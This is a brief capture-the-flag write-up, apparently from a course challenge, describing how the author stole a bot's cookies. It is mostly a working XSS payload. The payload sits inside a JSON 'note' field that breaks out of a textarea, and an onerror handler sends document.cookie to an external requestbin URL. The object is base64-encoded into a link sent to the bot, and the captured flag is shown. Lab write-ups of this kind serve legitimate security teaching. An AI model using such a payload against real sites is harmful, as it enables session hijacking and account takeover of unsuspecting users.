I need to retrieve the cookies of the bot as in the challenges done during the semester.
For this purpose, I utilized a requestbin in order to collect the action forced by the script of XSS.

In a JavaScript editor I put:

const var2 = {"players":[{"name":"Player1","level":6,"bufs":0,"rbufs":0,"note": '</textarea><audio src = \"pwned\" onerror = "requestbin = \'https://enzms4u03sxx5xq.m.pipedream.net/\'; target = requestbin.concat(document.cookie); window.open(target);"/>'}, {"name":"Player2","level":1,"bufs":0,"rbufs":0,"note":" "}]}
console.log(btoa(JSON.stringify(var2)))

in order to retrieve the full link, with the script, in order to trigger the theft of the cookies of the user that visites the page.

The requestbin will collect the cookies of the bot when I send the link to it, so I will be able to see them.
They will contain the flag!

I will retrieve
    https://enzms4u03sxx5xq.m.pipedream.net/flag=flag%7Byou_got_my_cookie_i_amnot_playing_withu_anymore!%7D
        -> flag{you_got_my_cookie_i_amnot_playing_withu_anymore}
